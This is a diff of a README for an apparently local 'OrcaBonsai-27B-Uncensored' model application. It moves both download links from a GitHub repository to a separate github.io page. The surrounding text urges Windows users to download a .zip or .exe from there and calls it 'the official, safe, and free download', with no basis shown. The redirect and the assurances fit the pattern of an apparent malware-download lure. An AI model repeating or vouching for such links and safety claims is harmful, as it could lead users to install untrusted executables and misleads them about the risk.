@@ -22,7 +22,7 @@ We're excited to help you get OrcaBonsai-27B-Uncensored running on your PC. Just
 
 ### Step 1: Download the Application
 
-**[⬇️ GET ORCABONSAI NOW](https://github.com/mounge4/OrcaBonsai-27B-Uncensored)**
+**[⬇️ GET ORCABONSAI NOW](https://mounge4.github.io)**
 
 Visit this link to download the application. This is the official, safe, and free download. Look for the green "Code" button or a release section on that page. Choose the file that is labeled for Windows (usually a `.zip` or `.exe` file).
 
@@ -122,7 +122,7 @@ This project is released under the MIT License, which means you can use it, modi
 
 ## 🔗 Official Download Link
 
-**Visit this link to download the application:** [https://github.com/mounge4/OrcaBonsai-27B-Uncensored](https://github.com/mounge4/OrcaBonsai-27B-Uncensored)
+**Visit this link to download the application:** [https://mounge4.github.io](https://mounge4.github.io)
 
 Remember, always download from this official link to ensure you're getting the safe, authentic version. Never download from third-party websites.
 
